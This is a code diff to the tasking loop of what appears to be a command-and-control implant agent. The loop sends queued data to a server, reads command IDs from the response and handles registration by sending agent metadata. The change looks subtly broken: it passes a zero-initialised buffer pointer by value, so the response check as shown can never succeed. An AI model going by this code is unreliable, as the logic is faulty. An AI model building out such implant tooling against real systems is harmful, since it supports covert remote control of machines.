@@ -4,7 +4,7 @@
 void TaskingRoutine() {
 
     PARSER   Parser = { 0 };
-    DataBuffer   Buffer = { 0 };
+    pDataBuffer   Buffer = { 0 };
     SIZE_T   DataBufferSize = { 0 };
     PARSER   TaskParser = { 0 };
     LPVOID   TaskBuffer = { 0 };
@@ -32,30 +32,39 @@ void TaskingRoutine() {
         }
 
         //TODO perform package sending request. that will send all open packages and receive any responses from the server for commands to execute.
-        if (!PackageSendAll(&Buffer, &DataBufferSize))
+        if (!PackageSendAll(Buffer, &DataBufferSize))
         {
             break;
         }
-
-		NewParser(&Parser, Buffer.Buffer, Buffer.BufferLength);
-		AgentCMD.CommandID = ParserReadInt32(&Parser);
-		AgentCMD.RequestID = ParserReadInt32(&Parser);
         
-        switch (AgentCMD.CommandID) {
-        case NO_JOB:
-			break;
+		if (Buffer && Buffer->BufferLength > 0) { // if we successfully sent our queued packages and received a response.
 
-        case REGISTER_AGENT:
-            PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL);
-            break;
+            NewParser(&Parser, Buffer->Buffer, Buffer->BufferLength);
+            AgentCMD.CommandID = ParserReadInt32(&Parser);
+            AgentCMD.RequestID = ParserReadInt32(&Parser);
 
-        default:
-            break;
+            switch (AgentCMD.CommandID) {
+            case NO_JOB:
+                break;
+
+            case REGISTER_AGENT:
+                PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL);
+                break;
+
+            default:
+                break;
+            }
         }
+        else // we did not rececive a response from the server server is down or we have no connectivity.
+        { 
+			break;
+        }
+
 		
     }
 
-	
+    agent->session->Active = FALSE;
+
 }
 
 
